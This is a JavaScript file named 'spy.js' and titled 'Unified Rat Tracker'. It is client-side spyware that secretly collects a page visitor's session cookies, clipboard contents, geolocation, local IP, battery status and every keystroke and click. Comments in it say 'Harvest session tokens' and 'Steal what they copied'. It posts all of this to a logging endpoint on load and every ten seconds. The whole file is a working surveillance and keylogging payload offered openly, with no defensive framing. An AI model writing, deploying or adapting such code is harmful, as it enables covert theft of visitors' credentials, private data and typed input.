// public/spy.js - Unified Rat Tracker

// --- Helper: Get Local IP via RTCPeerConnection ---
async function getLocalIP() {
    return new Promise((resolve) => {
        const connection = new RTCPeerConnection({ iceServers: [] });
        connection.createDataChannel("");
        connection.createOffer().then(offer => connection.setLocalDescription(offer));
        let resolved = false;
        const handler = (event) => {
            if (resolved) return;
            if (!event.candidate) {
                connection.close();
                resolved = true;
                resolve(null);
            } else if (/candidate.*127/.test(event.candidate.candidate)) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{3})/);
                if (ipMatch) {
                    connection.close();
                    resolved = true;
                    resolve(ipMatch[0]);
                }
            }
        };
        connection.onicecandidate = handler;
        setTimeout(() => {
            if (!resolved) {
                connection.close();
                resolved = true;
                resolve(null);
            }
        }, 2000);
    });
}

// --- Helper: Get Battery Status ---
async function getBattery() {
    try {
        if (navigator.getBattery) return await navigator.getBattery();
    } catch (e) {}
    return null;
}

// --- Core Payload Builder ---
async function buildPayload(extraType = null, extraData = {}) {
    const payload = {
        timestamp: Date.now(),
        user_agent: navigator.userAgent,
        screen_res: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        visibility_state: document.visibilityState,
        cookies: document.cookie, // Harvest session tokens
        ...extraData
    };

    // 1. Location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                payload.lat = pos.coords.latitude;
                payload.lon = pos.coords.longitude;
                payload.accuracy = pos.coords.accuracy;
                sendPayload(payload);
            },
            () => {
                payload.lat = "denied";
                payload.lon = "denied";
                sendPayload(payload);
            }
        );
    } else {
        payload.lat = "unsupported";
        payload.lon = "unsupported";
        sendPayload(payload);
    }

    // 2. Battery & IP (Run concurrently)
    const [battery, localIP] = await Promise.all([getBattery(), getLocalIP()]);
    
    if (battery) {
        payload.battery_level = battery.level;
        payload.is_charging = battery.charging;
        payload.discharging_time = battery.dischargingTime;
    }
    if (localIP) payload.local_ip = localIP;

    // 3. Audio/Mic Check
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        payload.audio_active = audioCtx.state === 'running';
        audioCtx.close();
    } catch (e) {}

    // 4. Clipboard Read (Steal what they copied)
    try {
        const clipText = await navigator.clipboard.readText();
        if (clipText && clipText.length < 1000) {
            payload.clipboard_content = clipText;
        }
    } catch (e) {}

    // Send the full payload once all async tasks are done
    // Note: The location callback above sends immediately upon fix. 
    // This block ensures we have the IP/Battery/Clipboard data attached to a log if needed later.
    if (payload.lat !== undefined && payload.lat !== "denied" && payload.lat !== "unsupported") {
         // If we already sent via GPS callback, don't double send unless it's an update
         // But for simplicity, we just send everything here as a "Full State" update
         sendPayload(payload);
    }
}

// --- Sender ---
async function sendPayload(data) {
    try {
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("Send failed", e);
    }
}

// --- Event Listeners (Keylogger / Mouse) ---
document.addEventListener('keydown', (e) => {
    fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            type: 'key',
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            shift: e.shiftKey,
            timestamp: Date.now()
        })
    }).catch(() => {});
});

document.addEventListener('click', (e) => {
    fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            type: 'click',
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            timestamp: Date.now()
        })
    }).catch(() => {});
});

// --- Initialization ---
trackRat();

function trackRat() {
    // Initial heavy beacon
    buildPayload('start');
    
    // Periodic heartbeat for status updates (every 10s)
    setInterval(() => {
        buildPayload('heartbeat');
    }, 10000);
}